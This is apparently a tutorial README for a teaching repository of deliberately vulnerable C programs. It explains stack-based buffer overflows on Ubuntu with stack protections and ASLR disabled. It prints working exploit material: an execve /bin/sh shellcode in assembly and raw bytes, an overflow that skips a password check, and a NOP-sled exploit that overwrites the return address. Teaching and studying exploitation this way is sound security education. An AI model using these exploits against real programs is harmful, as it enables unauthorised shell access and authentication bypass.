# overflow_with_joy

This is a collection of programs written in c that are vulnerable for buffer overflows and exploits.

## Background ##

The memory of a program is seperated in different parts, including text for the code, data, bss, heap and stack. The data segment is for initialized static and global variables, the bss section is for uninitilized static and global variables. The heap is for dynamic memory accessed with new() or malloc(), and on the stack contains local variables and some other information. When a function is executed, it uses the stack to store its variables, parameters for other functions to call, some information about the control flow and so on. For example, when a program enters a function, it has to save the address of the next instruction to execute when it is done with the function and wants to return, and this return address is saved on the stack.

![Stack](https://github.com/LauraWartschinski/overflow_with_joy/blob/master/img/stack.png)

Some vulnerabilities in code can make it possible to manipulate that stack, e.g. to overwrite the return address, which will cause the programm to jump to a different place in the memory and possibly execute instructions there. Many times, this happens because a buffer - a designated block of memory that stores some values of the same type - is not managed correctly, allowing for values to be written that exceed the capacity of the buffer and overwrite whatever comes next on the stack, possible until the return address (see image below). For a comprehensive introduction into the topic of buffer overflows and executing shell code on the stack, see [smashing the stack for fun and profit](http://www-inst.eecs.berkeley.edu/~cs161/fa08/papers/stack_smashing.pdf).


## Setup ##
To compile the files with the flags, execute
```./compile-all.sh```
All code is compiled with some flags that make it easier to execute exploits:  `-fno-stack-protector` to not include stack canaries etc., `-z execstack` to make the stack executable, and `-O0` to remove optimizations. All exploits are made to execute on a 64 bit architecture and are tested in Ubuntu 18.04. The full command is for example 
`gcc hackme1.c -o hackme1 -O0 -fno-stack-protector -z execstack -g`. This script also disables ASLR (stack randomization), which helps because the memory addresses will stay the same between two executions of the program. 

![makeshellcode script](https://github.com/LauraWartschinski/overflow_with_joy/blob/master/img/makeshellcode.png)

There is also a script `makeshellcode.sh`, which will automatically generate the bytes of assembly code for the instructions specified in `shellcode-creator.c`. It does so by starting the gdb and using its disass function to look at the bytes, to speed up the process of manual inspection. However, it will stop at the first `ret` instruction it encounters. As long as you don't use this, it's fine. Otherwise you might just need to figure out the instructions yourself. 


## Hackme 1 ##

To warm up, let's have a look at a program that was made to be exploited.

`hackme1.c`

```
int main(void)
{
    char shellcode[] = "[shellcode here]";
 
    (*(void (*)()) shellcode)();
     
    return 0;
}
```

This very simple program takes some shellcode and executes it. This is possible because the variable shellcode is casted to a function pointer of the type `void (*)()`, a function pointer for an unspecified number of parameters. Therefore, the shellcode is cast into a function and then calls it, essentially running the shellcode.

In `exploit1.c`, shellcode is inserted that will cause the program to set the registers correctly and then execute a syscall, which will start a new shell. The following assembly commands achieve this while also avoiding any null bytes. There are, however, many other ways to achieve the same goal. 

```
"jmp j2;" //short jump to avoid null bytes in the shellcode
"j1: jmp start;" //jump to the rest of the shellcode
"j2: call j1;" //put the address of the string /bin/sh on the stack
".ascii \"/bin/shX\";"
"start: pop %rdi;" //take the address of the string /bin/sh from the stack
"xor %rax, %rax;" //set RAX to zero
"movb %al, 7(%rdi);" //set a nullbyte after the /bin/sh in the written file
"mov $0x3b, %al;" //put the syscall number in rax, in this case execve
"xor %rsi,%rsi;" //RSI must be set to zero
"xor %rdx,%rdx;" //RDX must be set to zero    
"syscall;" //start the 
```



## Hackme 2 ##

In the next example, we are looking at a C program that was not made to be exploited, but contains a buffer overflow vulnerability. The program takes an input as argument and checks if that input is correct, displaying either "password correct" or "wrong password". Of course, it might execute some other functionality, but this is just a minimal example. The goal here is to get the program to execute the code for the correct password, without actually entering the correct password. If it crashes later, that's okay, since the goal was reached anyway. 

The programm can simply be executed with `./hackme2 mypassword`. This is the sourcecode: 

```
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int check_password(char *password){
  int correct = 0;
  char password_buffer[16];
  
  strcpy(password_buffer, password);
  
  if (strcmp(password_buffer, "actualpw") == 0) {
    correct = 1;
  }
  
  return correct;
  
  
}


int main (int argc, char *argv[]) {
  if (argc < 2) {
		puts("Please enter your password as a command line parameter.");
  } else {
    if (check_password(argv[1])) {
      printf("Password correct.\n");
    } else {
      printf("Wrong password.\n");
    }
  }

  return 0;
  
}
``` 

In the check_password function, a buffer of length 16 is created to store the password. There is also a variable `int correct` that will contain 0 if the password is wrong, or 1 if the password was evaluated to be correct. This local variable is placed on the stack (here at location `rbp-8`, directly above the base pointer of the stack). At the end of the function, it is loaded into the register eax, which can be seen in the disassembled code of check_password at location +68. The main function then checks if eax is zero or not (with the `test %eax, %eax'` at position +54) and jumps to the different outputs depending on the result. When "actualpw" is passed to the program as paramter, the variable `correct` contains 00000001 and is there not zero, causing the program to display "oassword correct".

When the buffer in check_password gets filled with bytes, it grows in the direction of the variable `correct`. With a length of 16 bytes, it overwrites the variable to contain e.g. `0x4141414141414141`, which is also evaluated to be not zero, so the main function jumps into the "password correct" branch once more, even though the correct password was never entered. 

![exploit2](https://github.com/LauraWartschinski/overflow_with_joy/blob/master/img/exploit2.png)

The programm `exploit2` just produces the correct number of bytes as an output.

## Hackme 3 ##

`hackme3.c`

``` 
#include<stdio.h>
#include<string.h>
int main(int argc, char *argv[])
{
  char buf[256];
  if (argc < 2)
    puts("Please enter your name as a command line parameter.");
  else
  {
    strcpy(buf,argv[1]);
    printf("Input was: %s\n",buf);
    return 0;
  }
}
``` 

This program accepts a a parameter and then writes it out again. However, the length of the parameter is not checked, and if it exceeds the 256 byte buffer, an oveflow will occur. This makes it possible to overwrite the return address, causing the programm to jump up on the stack into the buffer, where shellcode has been placed, and this can then be executed to start another shell. The code in `exploit3.c` produces a string of bytes that serve exactly this function. Execute both with `./hackme3 $(./exploit3)`. 

```
#include <stdio.h>
#include <string.h>
  
char shellcode[] = "\xeb\x02\xeb\x0d\xe8\xf9\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68\x58\x5f\x48\x31\xc0\x88\x47\x07\xb0\x3b\x48\x31\xf6\x48\x31\xd2\x0f\x05\xaa\xaa\xaa\xaa\xaa\xaa\x08\xdd\xff\xff\xff\x7f";

int main()
{
  int i;
  for (i = 0; i < (256 - strlen(shellcode) + 8 + 6); i++)
  {
    printf("\x90");
  }
  printf("%s",shellcode);
  return 0;
}
```